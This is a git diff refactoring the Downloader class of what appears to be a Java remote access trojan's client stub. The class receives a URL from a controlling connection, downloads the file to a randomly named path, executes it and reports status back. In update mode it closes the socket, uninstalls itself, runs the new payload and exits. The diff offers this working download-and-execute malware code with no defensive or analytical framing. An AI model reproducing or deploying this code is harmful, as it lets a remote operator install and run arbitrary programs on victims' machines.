@@ -15,12 +15,14 @@ import com.redpois0n.oslib.OperatingSystem;
 
 public class Downloader extends Thread {
 
+	private Connection con;
 	private String url;
 	private boolean update;
 	private Downloadable type;
 	private boolean readFromSocket;
 
-	public Downloader(String url, boolean update, String type, boolean readFromSocket) {
+	public Downloader(Connection con, String url, boolean update, String type, boolean readFromSocket) {
+		this.con = con;
 		this.url = url;
 		this.update = update;
 		this.type = Downloadable.get(type);
@@ -29,7 +31,7 @@ public class Downloader extends Thread {
 
 	public void run() {
 		try {
-			Connection.instance.status(Constants.STATUS_DOWNLOADING_FILE);
+			con.status(Constants.STATUS_DOWNLOADING_FILE);
 
 			String fileName = (new Random().nextInt()) + type.getExtension();
 
@@ -51,10 +53,10 @@ public class Downloader extends Thread {
 				
 				
 				if (readFromSocket) {
-					//new FileIO().readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.aesKey);					
+					//new FileIO().readFile(file, con.getSocket(), con.getDataInputStream(), con.getDataOutputStream(), null, Main.aesKey);					
 				} else {
-					URLConnection con = new URL(url).openConnection();
-					InputStream in = con.getInputStream();
+					URLConnection ucon = new URL(url).openConnection();
+					InputStream in = ucon.getInputStream();
 					
 					FileOutputStream fout = new FileOutputStream(file);
 
@@ -71,17 +73,17 @@ public class Downloader extends Thread {
 
 				if (update) {
 					try {
-						Connection.instance.getSocket().close();
+						con.getSocket().close();
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
-					new Uninstaller().start();
+					new Uninstaller(con).start();
 					type.execute(file);
 					Configuration.running = false;
 					System.exit(0);
 				} else {
 					type.execute(file);
-					Connection.instance.status(Constants.STATUS_EXECUTED_FILE);
+					con.status(Constants.STATUS_EXECUTED_FILE);
 				}
 			} finally {
 
